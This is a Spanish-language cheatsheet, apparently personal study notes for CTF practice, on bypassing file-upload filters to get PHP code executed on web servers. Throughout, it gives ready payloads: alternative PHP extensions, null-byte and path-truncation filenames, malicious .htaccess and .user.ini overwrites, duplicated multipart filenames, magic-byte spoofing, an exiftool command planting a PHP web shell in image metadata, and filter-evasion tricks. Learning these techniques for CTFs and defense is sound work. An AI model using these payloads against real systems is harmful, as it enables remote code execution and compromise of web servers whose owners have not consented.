---
aliases:
tags:
  - type/cheatsheet
type: Concept
linked:
  - "[[File Upload Vulnerabilities]]"
---
# File Upload Bypass

***

## Cheatsheet

| **Categoría**                 | **Vector o Técnica**       | **Análisis y Ejecución**                                                                                                                                                                                                                                                |
| ----------------------------- | -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Reconocimiento del Filtro** | Extension Blacklist        | Bloquea extensiones específicas.<br><br>_Síntoma:_ Error "Extension 'php' not allowed".                                                                                                                                                                                 |
| **Reconocimiento del Filtro** | Extension Whitelist        | Solo permite específicas.<br><br>_Síntoma:_ Error "Extension 'hack' not allowed" ante prueba inventada.                                                                                                                                                                 |
| **Reconocimiento del Filtro** | Validación de Contenido    | Escanea el archivo en búsqueda de `<?php`, `system` o cabeceras de imagen inválidas.                                                                                                                                                                                    |
| **Reconocimiento del Filtro** | Parsing del Nombre         | _Prueba:_ Enviar `file.php.` -> Si el error es "Extension ''", el servidor corta en el último punto.                                                                                                                                                                    |
| **Bypass de Listas Negras**   | Extensiones Alternativas   | Servidores (Apache/Nginx) suelen ejecutar extensiones legacy si no están bloqueadas explícitamente: `.phtml` (común en CTFs), `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phar`.                                                                                      |
| **Bypass de Listas Negras**   | Manipulación de Caracteres | **Case Sensitivity:** `.PhP`, `.PHP`, `.phtml` (útil si el filtro es `str_replace`).<br><br>**Trailing Dot/Space:** `shell.php.` (Windows/Apache puede ignorar el punto) o `filename="shell.php "` (espacio al final en Burp).                                          |
| **Bypass de Listas Blancas**  | Null Byte Injection        | Engaña al sistema para truncar el nombre.<br><br>_Payload:_ `filename="shell.php%00.jpg"` (Requiere URL Decode del `%00` en Burp para enviar el byte nulo real).                                                                                                        |
| **Bypass de Listas Blancas**  | Path Truncation            | Excede el límite de caracteres del SO (`MAX_PATH`).<br><br>_Payload:_ `shell.php` + `.` (x300 veces) + `.jpg`. Guarda `shell.php` al cortar el final.                                                                                                                   |
| **Bypass de Listas Blancas**  | Doble Extensión            | Se aprovecha de misconfigurations (ej. Apache usando `AddHandler`).<br><br>_Payload:_ `shell.php.jpg` -> Apache evalúa la extensión anterior y ejecuta PHP.                                                                                                             |
| **Ataques a Configuración**   | Sobrescribir `.htaccess`   | _Bypass de nombre:_ `filename=".htaccess%00.jpg"` o spoofing de Content-Type a `image/jpeg`.<br><br>_Payload (.htaccess):_ `AddType application/x-httpd-php .pwn`<br><br>_Ejecución:_ Subir `.htaccess` y luego el payload como `shell.pwn%00.jpg`.                     |
| **Ataques a Configuración**   | Sobrescribir `.user.ini`   | Funciona en PHP-FPM/FastCGI inyectando scripts en el directorio.<br><br>_Bypass de nombre:_ `filename=".user.ini%00.jpg"`<br><br>_Payload (.user.ini):_ `auto_prepend_file = shell.jpg`<br><br>_Ejecución:_ Subir archivo INI, subir `shell.jpg` y visitar `index.php`. |
| **Técnicas de Confusión**     | [[Parameter Pollution]]    | El WAF valida el primer nombre, el Backend (PHP) usa el último.<br><br>_Payload:_ `filename="foto.jpg"; filename="shell.php"`                                                                                                                                           |
| **Técnicas de Confusión**     | Content-Type Spoofing      | Cambiar el tipo MIME de `application/x-php` a `image/jpeg`. Añadir [[Magic Bytes]] (`GIF89a;`) al inicio del archivo para engañar a validaciones como `exif_imagetype`.                                                                                                 |
| **Técnicas de Confusión**     | Inyección de Metadatos     | Útil en combinación con LFI o `.htaccess`.<br><br>_Ejecución:_ `exiftool -Comment='<?php system($_GET["c"]); ?>' imagen.jpg`                                                                                                                                            |
| **Evasión de Contenido**      | Filtros de Strings         | **Short Tags:** `<?=` en lugar de `<?php echo`.<br><br>**Legacy:** `<script language="php"> system('ls'); </script>`.<br><br>**PHP No Alfanumérico:** Operaciones XOR/Bitwise.<br><br>**Codificación:** Uso de `base64_decode` o php wrappers.                          |
| **Lógica CTF Contextual**     | [[Auth Bypass]]            | Inspección de campos ocultos (`<input type="hidden" name="pass">`).<br><br>_Pruebas:_ Alterar valores, eliminar el campo, o inyectar un array (`pass[]`). La flag de niveles previos frecuentemente es la credencial del nivel actual.                                  |

___

## Overview

### Reconocimiento del Filtro

*Antes de atacar, identificar cómo valida el servidor:*

- **Extension Blacklist:** Bloquea extensiones específicas (ej: `.php`, `.phtml`).
    - _Síntoma:_ Error "Extension 'php' not allowed".
- **Extension Whitelist:** Solo permite específicas (ej: `.jpg`, `.png`).
    - _Síntoma:_ Error "Extension 'hack' not allowed" (al probar una inventada).
- **Validación de Contenido:** Escanea el archivo buscando `<?php`, `system` o cabeceras de imagen inválidas.
- **Parsing del Nombre:** Cómo lee el servidor el nombre del archivo.
    - _Prueba:_ `file.php.` -> Si el error es "Extension ''", el servidor corta por el último punto.

---

### Bypass de Listas Negras (Blacklist)

_Si el servidor bloquea `.php` pero permite otras cosas._

#### A. Extensiones Alternativas

Apache/Nginx a menudo ejecutan extensiones legacy o alternativas si no están explícitamente bloqueadas.
- `.phtml` (La más común en CTFs)
- `.php3`, `.php4`, `.php5`, `.php7`    
- `.pht`
- `.phar`

#### B. Manipulación de Caracteres

- **Case Sensitivity:** `.PhP`, `.PHP`, `.phtml` (Funciona si el filtro es `str_replace` o sensible a mayúsculas).
- **Trailing Dot/Space:**
    - `shell.php.` (Windows/Apache a veces ignora el punto final al guardar).
    - `shell.php` (Espacio al final). En Burp: `filename="shell.php "`.

---

### Bypass de Listas Blancas (Whitelist)

_Si el servidor exige que el archivo termine en `.jpg`._

#### A. Null Byte Injection (`%00`)

Engaña al sistema de archivos para truncar el nombre.
- **Payload:** `filename="shell.php%00.jpg"`
- **Proceso:**
    1. Filtro Web lee `.jpg` -> ✅ Pasa.
    2. Sistema de Archivos lee hasta `%00` -> Guarda `shell.php`.
- **Nota:** Requiere _URL Decode_ del `%00` en Burp para que sea un byte nulo real.

#### B. Path Truncation (Desbordamiento)

Exceder el límite de caracteres del SO (MAX_PATH) para cortar la extensión.
- **Payload:** `shell.php` + `.` (x300 veces) + `.jpg`
- **Resultado:** Se guarda `shell.php` porque el `.jpg` del final se corta.

#### C. Doble Extensión (Misconfiguration)

Si Apache tiene `AddHandler` en lugar de `SetHandler`.
- **Payload:** `shell.php.jpg`
- **Resultado:** Apache no sabe qué hacer con `.jpg`, mira la extensión anterior (`.php`) y la ejecuta.

---

### Ataques a la Configuración del Servidor (.htaccess / .user.ini)

_Si no puedes subir un `.php`, reconfigura el servidor para que ejecute imágenes._

#### A. Sobrescribir `.htaccess` (Apache)

- **Objetivo:** Hacer que archivos `.jpg` (o extensiones inventadas) se ejecuten como PHP.
- **Bypass de Nombre:** El servidor suele bloquear subir `.htaccess`.
    - Usar Null Byte: `filename=".htaccess%00.jpg"`
    - Usar Content-Type falso: Cambiar a `image/jpeg`.

- **Contenido del Payload (.htaccess):**
    ```Apache
    # Opción 1: Ejecutar JPG como PHP
    AddType application/x-httpd-php .jpg
    
    # Opción 2: Ejecutar extensión rara (evita detección básica)
    AddType application/x-httpd-php .pwn
    ```
- **Ataque:**
    1. Subir `.htaccess` malicioso.
    2. Subir shell: `shell.jpg` (o `shell.pwn%00.jpg` si usaste la opción 2).

#### B. Sobrescribir `.user.ini` (PHP-FPM / FastCGI)

- **Objetivo:** Inyectar un script en todas las páginas PHP del directorio.
- **Bypass de Nombre:** `filename=".user.ini%00.jpg"`
- **Contenido del Payload:**
    ```    Ini, TOML
    auto_prepend_file = shell.jpg
    ```
- **Ataque:**
    1. Subir `.user.ini`.
    2. Subir `shell.jpg` (con código PHP camuflado).
    3. Visitar `index.php` (o cualquier php en la carpeta) -> Se ejecuta la shell automáticamente.

---

### Técnicas de Confusión (WAF vs Backend)

#### Parameter Pollution (Doble Filename)

El WAF valida el primero, PHP usa el último.
```HTTP
Content-Disposition: form-data; name="file"; filename="foto.jpg"; filename="shell.php"
```

#### Content-Type Spoofing

- Cambiar `application/x-php` por `image/jpeg`.
- Añadir **Magic Bytes** al inicio del archivo: `GIF89a;` (hace parecer que es un GIF para `exif_imagetype`).

#### Inyección de Metadatos (Exif)

Esconder código PHP en los comentarios de una imagen legítima.
```Bash
exiftool -Comment='<?php system($_GET["c"]); ?>' imagen.jpg
```

(Útil si se combina con `.htaccess` o LFI para ejecutarlo).

---

### Evasión de Filtros de Contenido

_Si el servidor lee el archivo y bloquea `<?php` o `system`._
- **Short Tags:** `<?=` en lugar de `<?php echo`.
- **Script Tag (Legacy):** `<script language="php"> system('ls'); </script>`
- **PHP No Alfanumérico:** Usar operaciones XOR/Bitwise para generar strings sin escribir letras.
- **Codificación:** Usar `base64_decode` o filtros de streams si es un LFI.

---

### Lógica CTF / Contexto

- **Auth Bypass:** Revisar campos ocultos (`<input type="hidden" name="pass">`).
    - Probar: Cambiar valor, borrar campo, enviar array `pass[]`.
    - **Regla de Oro:** La flag del nivel anterior suele ser la password del siguiente.